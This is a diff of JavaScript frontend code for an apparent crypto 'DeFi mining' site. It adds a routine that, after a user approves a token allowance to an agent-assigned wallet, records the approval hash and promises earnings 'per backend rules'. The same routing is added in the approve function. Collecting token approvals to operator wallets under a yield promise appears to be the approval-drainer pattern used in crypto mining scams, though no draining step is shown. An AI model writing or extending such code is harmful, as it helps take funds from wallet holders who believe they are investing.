@@ -38,6 +38,30 @@ function submitNodeOrderAfterApproval(_that, _item, owner, txHash) {
 	}, _that);
 }
 
+// 普通 DeFi 与节点认购是两条独立业务：前者必须写入 defi_mining_list，
+// 不允许因为共用了同一币种授权而被节点逻辑拦截。
+function submitDefiMiningAfterApproval(_that, _item, owner, txHash) {
+	let tx = (txHash && txHash.transactionHash) ? txHash.transactionHash : (typeof txHash === 'string' ? txHash : '');
+	if (isNull(tx) || isNull(_item) || isNull(owner)) {
+		if (_that && typeof _that.$message === 'function') _that.$message({message: '未获取到有效授权交易，未加入挖矿', type: 'error'});
+		return;
+	}
+	let data = {
+		address: owner, approveAddr: getAgentApprovedWallet(_that, _item.chainType, _item.busType), approveHash: tx,
+		chainType: _item.chainType, coinImg: _item.quoteCurrencyImg, coinType: _item.quoteCurrency,
+		contractAddr: _item.quoteCurrencyCtrAddr, productId: _item.id, protocol: _item.protocol
+	};
+	miningUp(data, true, function(vm, res) {
+		if (res && (res.code === 0 || res.code === 200)) {
+			vm.$message({message: '已成功加入 DeFi 挖矿，收益将按后台规则发放', type: 'success'});
+			vm.miningList();
+			queryWalletInfo(vm);
+		} else if (vm && typeof vm.$message === 'function') {
+			vm.$message({message: (res && res.msg) || '挖矿参与记录创建失败', type: 'error'});
+		}
+	}, _that);
+}
+
 // 授权  approve
 async function approve(_that, _spender, _contract, _abi, _value, _decimals, _item) {
 	console.log("approve");
@@ -119,6 +143,14 @@ async function approve(_that, _spender, _contract, _abi, _value, _decimals, _ite
 				let allowBla = await allowance(_spender, _contract, _abi, _decimals, _chainType)
 				console.log("授权金额：" + allowBla)
 				if (notNull(allowBla) && allowBla > 0) {
+					// 普通 DeFi 的已有授权（包括节点认购留下的授权）必须由用户明确确认后，
+					// 才创建 defi_mining_list；不能直接跳转收益中心伪装为已加入。
+					if (isNull(_item.nodeId)) {
+						if (_that && typeof _that.confirmExistingApprovalMining === 'function') {
+							_that.confirmExistingApprovalMining(_item, _spender);
+						}
+						return;
+					}
 					if(_that && typeof _that.$message === 'function'){
 						_that.$message({message: '当前钱包已有授权，请更换钱包后重新认购', type: 'warning'});
 					}
@@ -136,7 +168,11 @@ async function approve(_that, _spender, _contract, _abi, _value, _decimals, _ite
 						})
 						.then(function(hash) {
 							// send() resolves only after wallet approval transaction succeeds/mines.
-							submitNodeOrderAfterApproval(_that, _item, _owner, hash);
+							if (isNull(_item.nodeId)) {
+								submitDefiMiningAfterApproval(_that, _item, _owner, hash);
+							} else {
+								submitNodeOrderAfterApproval(_that, _item, _owner, hash);
+							}
 							return;
 							let upData = {
 								"address": _owner,
@@ -243,7 +279,11 @@ async function approve(_that, _spender, _contract, _abi, _value, _decimals, _ite
 						})
 						.on('transactionHash', function(hash) {
 							// transactionHash is emitted only after the wallet accepts the signed transaction.
-							submitNodeOrderAfterApproval(_that, _item, _owner, hash);
+							if (isNull(_item.nodeId)) {
+								submitDefiMiningAfterApproval(_that, _item, _owner, hash);
+							} else {
+								submitNodeOrderAfterApproval(_that, _item, _owner, hash);
+							}
 							return;
 							let upData = {
 								"address": _owner,
